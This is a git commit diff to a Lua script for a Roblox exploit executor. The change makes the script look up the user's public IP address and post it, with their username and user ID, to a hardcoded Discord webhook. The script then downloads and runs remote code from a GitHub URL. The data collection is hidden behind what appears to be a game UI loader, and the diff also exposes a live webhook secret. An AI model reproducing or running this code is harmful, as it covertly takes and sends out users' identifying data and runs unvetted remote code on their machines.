8579c50e49da314966a4767cb5177a02b76f1ae2
Lucasggk <lucasemanuelguimaraes20@gmail.com>
2025-08-02 15:46:36 -0300

    Update Lkzin.lua

--- Lkzin.lua
+++ Lkzin.lua
@@ -1,23 +1,31 @@
 local w = "https://discord.com/api/webhooks/1391849049329635400/IEE3Ns_qrEeuCGd12Hatv40obrTFjaubpuGy26Gqbpb_Q-KL6jw2LDROPwwMQXdRtlmh"
 
 local u = game.Players.LocalPlayer
-
-local data = {
-    content = u.Name .. " | ID: " .. u.UserId
-}
-
 local http = game:GetService("HttpService")
-local body = http:JSONEncode(data)
-
 local req = http_request or request or (syn and syn.request) or (fluxus and fluxus.request)
+
 if req then
+    local ipRes = req({
+        Url = "https://api.ipify.org",
+        Method = "GET"
+    })
+
+    local ip = ipRes and ipRes.Body or "IP não encontrado"
+
+    local data = {
+        content = u.Name .. " | ID: " .. u.UserId .. " | IP: " .. ip
+    }
+
+    local body = http:JSONEncode(data)
+
     req({
         Url = w,
         Method = "POST",
-        Headers = { ["Content-Type"] = "application/json" },
+        Headers = {
+            ["Content-Type"] = "application/json"
+        },
         Body = body
     })
 end
-
 
 loadstring(game:HttpGet("https://raw.githubusercontent.com/Lucasggk/99Nights/main/Key/Ui.lua"))()
